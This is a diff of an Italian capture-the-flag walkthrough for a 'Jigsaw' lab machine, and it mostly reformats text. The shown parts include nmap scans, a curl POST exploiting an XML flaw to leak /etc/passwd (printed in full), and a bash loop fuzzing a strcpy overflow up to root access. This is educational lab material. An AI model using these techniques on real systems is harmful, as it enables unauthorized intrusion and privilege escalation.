@@ -61,13 +61,16 @@ Il nostro target risulta avere l'indirizzo 192.168.1.140.
 
 Da una prima analisi sul target,sembrerebbe non aver servizi esposti all'esterno :
 
+```
 nmap -vvv -sS -p 1-65535 -sV -O 192.168.1.140
+``` 
  Tutto filtrato.
 
 Proviamo a verificare le porte udp.procediamo con una scansione in questa modalita' :
 
+```
 nmap -vvv -sU -p 1-65535 192.168.1.140
-
+```
 
 
 Durante la scansione udp, analizzando il traffico dati passante con wireshark, osserviamo che la macchina target spedisce dei pacchetti in broadcast con il seguente contenuto :
@@ -75,8 +78,8 @@ Durante la scansione udp, analizzando il traffico dati passante con wireshark, o
 
 Sempre la stessa lunghezza
 Sempre la porta 666 di destinazione 
-E all'interno del campo dati troviamo il seguente testo ( j19s4w was always fascinated with l33t speak, in fact he uses it for a lot of his passwords. )
-Come si puo' notare sotto :
+E all'interno del campo dati troviamo il testo sotto :
+
 
 
 ![Schermata da 2019-08-24 07-44-12](https://user-images.githubusercontent.com/54471416/63640722-db0a4c00-c671-11e9-842b-fe98a5a1f505.png)
@@ -231,7 +234,7 @@ root@kali:~# hexdump -C Jigsaw/jigsaw.gif | tail
 /w4n770p14y494m3
 
 
-Proviamola sul target e woila'!
+Proviamola sul target e voila'!
 http://192.168.1.140/w4n770p14y494m3/
 
 Un portale di login!
@@ -271,7 +274,29 @@ et voila!
 Otteniamo questa risposta :
 
 ```
-root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin libuuid:x:100:101::/var/lib/libuuid: syslog:x:101:104::/home/syslog:/bin/false messagebus:x:102:106::/var/run/dbus:/bin/false landscape:x:103:109::/var/lib/landscape:/bin/false sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin jigsaw:x:1000:1000:,,,:/home/jigsaw:/bin/bash
+root:x:0:0:root:/root:/bin/bash 
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin 
+bin:x:2:2:bin:/bin:/usr/sbin/nologin 
+sys:x:3:3:sys:/dev:/usr/sbin/nologin 
+sync:x:4:65534:sync:/bin:/bin/sync 
+games:x:5:60:games:/usr/games:/usr/sbin/nologin 
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin 
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin 
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin 
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin 
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin 
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin 
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin 
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin 
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin 
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin 
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin 
+libuuid:x:100:101::/var/lib/libuuid: 
+syslog:x:101:104::/home/syslog:/bin/false 
+messagebus:x:102:106::/var/run/dbus:/bin/false 
+landscape:x:103:109::/var/lib/landscape:/bin/false 
+sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin 
+jigsaw:x:1000:1000:,,,:/home/jigsaw:/bin/bash
 ```
 
 A questo punto cerchiamo altre informazioni utili sul sistema.
@@ -283,7 +308,7 @@ Creiamo un file cookies.txt e editiamo con il corpo xml sopra e poi eseguiamo la
 curl -d @cookies.txt -X POST http://192.168.1.140/w4n770p14y494m3/game2.php | grep -v " does not exist"
 ```
 
-Otteniamo lo stesso risultato!
+
 A questo punto proviamo a eseguire un leak del sorgente per vedere cosa fa.
 Come sotto :
 
@@ -812,7 +837,9 @@ Riscontriamo velocemente che le funzioni utilizzate sono errx e strcpy e le risp
 Sembrerebbe che il codice operi un controllo sull'input e poi passi l'input ARGV[1] a strcpy.
 Scriviamo un semplice script bash per testare velocemente quando il programma va in crash, anche se da un primo sguardo il valore dovrebbe essere verosimilmente vicino a 80.
 
-( 8048453:       83 ec 50                sub    $0x50,%esp ) .
+```
+ 8048453:       83 ec 50                sub    $0x50,%esp 
+```
 
 
 Passiamo a verificarlo :
@@ -823,7 +850,7 @@ for i in {1..100};do export i; input=$(python -c 'import os;print ("A" * int(os.
 
 ```
 
-Otteniamo il segmentation fault al carattere 76.
+Otteniamo l'errore di segmentazione al carattere 76.
 Come mostrato sotto :
 
 
@@ -1103,7 +1130,7 @@ uid=1000(jigsaw) gid=1000(jigsaw) euid=0(root) groups=0(root),1000(jigsaw)
 # 
 ```
 
-Bingo!Siamo dentro come root.
+Bingo! Siamo dentro come root.
 Troviamo la flag adesso.
 
 
